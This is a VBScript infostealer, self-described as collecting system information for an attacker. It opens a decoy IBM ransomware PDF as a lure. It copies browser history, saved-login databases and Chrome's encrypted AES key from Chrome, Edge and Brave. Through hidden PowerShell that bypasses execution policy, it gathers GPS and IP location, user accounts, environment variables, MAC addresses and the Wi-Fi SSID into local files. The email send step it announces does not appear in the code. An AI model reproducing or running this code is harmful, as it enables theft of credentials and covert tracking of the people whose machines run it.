' Description: This script is used to collect system information and send it to the attacker's email address.

Dim objShell, objFSO, userProfile, localStatePath, objFile, jsonText, encryptedKey, outputFile, arrFiles, i

' Create Shell Object
Set objShell = CreateObject("WScript.Shell")
' Get user profile path
userProfile = objShell.ExpandEnvironmentStrings("%USERPROFILE%")

' Open the IBM ransomware PDF
objShell.Run "https://www.ibm.com/support/pages/system/files/inline-files/Ransomware%20and%20IBM%20i.pdf"
' Wait for 1 second
WScript.Sleep 1000


' extract Browser history files
' Create FileSystemObject
Set objFSO = CreateObject("Scripting.FileSystemObject")
' Array of browser history file locations
arrFiles = Array( _
    Array("chrome_history", userProfile & "\AppData\Local\Google\Chrome\User Data\Default\History"), _
    Array("edge_history", userProfile & "\AppData\Local\Microsoft\Edge\User Data\Default\History"), _
    Array("brave_history", userProfile & "\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History") _
)
' Copy history files to the current directory
For i = 0 To UBound(arrFiles)
    If objFSO.FileExists(arrFiles(i)(1)) Then
        objFSO.CopyFile arrFiles(i)(1),  "./" & arrFiles(i)(0) & ".db", True
    End If
Next
WScript.Sleep 1000


' Extract Browser Credential files
objShell.Run "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " _
    & " $browserPaths = @(" _
    &" @{ Name = 'chrome_login'; Path = '" & userProfile & "\AppData\Local\Google\Chrome\User Data\Default\Login Data' }," _
    &" @{ Name = 'chrome_local_state'; Path = '" & userProfile & "\AppData\Local\Google\Chrome\User Data\Local State' }," _
    &" @{ Name = 'edge_login'; Path = '" & userProfile & "\AppData\Local\Microsoft\Edge\User Data\Default\Login Data' }," _
    &" @{ Name = 'edge_local_state'; Path = '" & userProfile & "\AppData\Local\Microsoft\Edge\User Data\Local State' }," _
    &" @{ Name = 'brave_login'; Path = '" & userProfile & "\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data' }," _
    &" @{ Name = 'brave_local_state'; Path = '" & userProfile & "\AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State' } " _
    &" );" _
    &" foreach ($browser in $browserPaths) { " _
    &" if (Test-Path $browser.Path) { Copy-Item -Path $browser.Path -Destination ('" & "Browser_" & "' + $browser.Name + '.db') -Force }" _
    &" }", 0, True
WScript.Sleep 1000


' Extract the AES key from the Chrome browser
' Path to Chrome's Local State file
localStatePath = userProfile & "\AppData\Local\Google\Chrome\User Data\Local State"
' Create FileSystemObject
Set objFSO = CreateObject("Scripting.FileSystemObject")
' Read Local State file
If objFSO.FileExists(localStatePath) Then
    Set objFile = objFSO.OpenTextFile(localStatePath, 1, False)
    jsonText = objFile.ReadAll()
    objFile.Close
    Set objFile = Nothing
End If
' Extract the encrypted key using a regex pattern
Dim regex, matches
Set regex = New RegExp
regex.Pattern = """encrypted_key"":""(.*?)"""
regex.Global = False
Set matches = regex.Execute(jsonText)
If matches.Count > 0 Then
    encryptedKey = matches(0).SubMatches(0)
    
    ' Path to save the key
    outputFile = "./Chrome_aes_key.txt"
    
    ' Write key to a text file
    Set objFile = objFSO.CreateTextFile(outputFile, True)
    objFile.WriteLine "Encrypted Key (Base64): " & encryptedKey
    objFile.Close
    Set objFile = Nothing
End If
WScript.Sleep 1000


' Extract MAC address, GPS location, IP-based location, system information, and save to a text file
' Run PowerShell command
objShell.Run "powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command " _
& "Add-Type -AssemblyName System.Device; " _
& "$geo = New-Object System.Device.Location.GeoCoordinateWatcher; " _
& "$geo.Start(); " _
& "Start-Sleep -Seconds 5; " _
& "$latitude = $geo.Position.Location.Latitude; " _
& "$longitude = $geo.Position.Location.Longitude; " _
& "$output = @(); " _
& "$output += '=== GPS Location Data ==='; " _
& "$output += 'Latitude:  ' + $latitude; " _
& "$output += 'Longitude: ' + $longitude; " _
& "$output += 'https://www.google.com/maps/@'+$($latitude)+','+$($longitude); " _
& "$output += ''; " _
& "$output += '=== Fetching IP-Based Location ==='; " _
& "$ipLocation = Invoke-RestMethod -Uri 'https://ipinfo.io/json'; " _
& "$output += 'IP:          ' + $($ipLocation.ip); " _
& "$output += 'City:        ' + $($ipLocation.city); " _
& "$output += 'Region:      ' + $($ipLocation.region); " _
& "$output += 'Country:     ' + $($ipLocation.country); " _
& "$output += 'Location:    ' + $($ipLocation.loc); " _
& "$output += 'Postal Code: ' + $($ipLocation.postal); " _ 
& "$output += ''; " _
& "$output += '=== System Environment ==='; " _
& "$output += (Get-ChildItem Env: | Out-String); " _
& "$output += ''; " _
& "$output += '=== Users ==='; " _
& "$output += (Get-WmiObject Win32_UserAccount | Select-Object Name, Disabled, Lockout, PasswordChangeable, PasswordExpires, PasswordRequired, Status | Out-String); " _
& "$output += ''; " _
& "$output += '=== System Information ==='; " _
& "$output += (Get-ComputerInfo | Select-Object CsName, WindowsVersion, WindowsBuildLabEx, OsArchitecture, OsName, OsManufacturer, CsManufacturer, CsModel, CsSystemType, CsTotalPhysicalMemory, BiosSeralNumber, CsAdminPasswordStatus, CsUserName, TimeZone | Out-String); " _
& "$output += ''; " _
& "$output += (systeminfo | Select-String 'OS Version', 'System Manufacturer', 'Total Physical Memory', 'BIOS Version', 'Windows Directory', 'System Directory', 'Boot Device', 'Locale', 'Domain', 'Logon Server' | Out-String); " _
& "$output += ''; " _
& "$output += '=== MAC Information ==='; " _
& "$output += (Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object { $_.MACAddress -ne $null } | Select-Object Description, MACAddress | Out-String); " _
& "$output += ''; " _
& "$output += '=== MAC Along With IP ==='; " _
& "$output += (ipconfig /all | Out-String); " _
& "$output += ''; " _
& "$output += '=== Wi-Fi SSID ==='; " _
& "$ssid = (netsh wlan show interfaces) -match 'SSID' | Where-Object {$_ -notmatch 'BSSID'} -replace '.*SSID\s+:\s+', ''; " _
& "if ($ssid) { $output += 'SSID: ' + $ssid + '' } else { $output += 'Wi-Fi SSID: Not Connected' }; " _
& "$output | Set-Content -Path 'SystemInfo.txt'; ", 0, False

Set objShell = Nothing

